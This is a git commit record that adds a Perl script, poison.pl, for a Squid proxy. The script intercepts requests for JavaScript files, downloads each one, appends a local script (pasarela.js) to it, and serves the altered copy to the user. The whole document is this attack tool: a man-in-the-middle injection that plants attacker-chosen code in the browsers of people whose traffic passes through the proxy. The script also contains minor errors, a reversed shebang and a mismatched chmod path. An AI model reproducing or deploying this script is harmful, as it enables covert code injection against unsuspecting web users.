2fc42d81a78e80d3bbc7cd6c8872b787072ba6ce
evar1208 <efren.vargas.b@gmail.com>
2017-02-14 20:51:24 -0500

    Create poison.pl

---
+++ poison.pl
@@ -0,0 +1,24 @@
+!#/usr/bin/perl
+
+$| = 1;
+$count = 0;
+$pid = $$;
+
+while (<>)
+{
+   chomp $_;
+   if ($_ =~ /(.*\.js)/i)
+   {
+	$url = $1;
+	system("/usr/bin/wget", "-q", "-O", "/var/www/tmp/$pid-$count.js", "$url");
+	system("chmod o+r /var/www/$pid-$count.js");
+	system("cat /etc/squid/pasarela.js >> /var/www/tmp/$pid-$count.js");
+	print "http://127.0.0.1/tmp/$pid-$count.js\n";
+   }
+   else
+   {
+	print "$_\n";
+   }
+
+   $count++;
+}
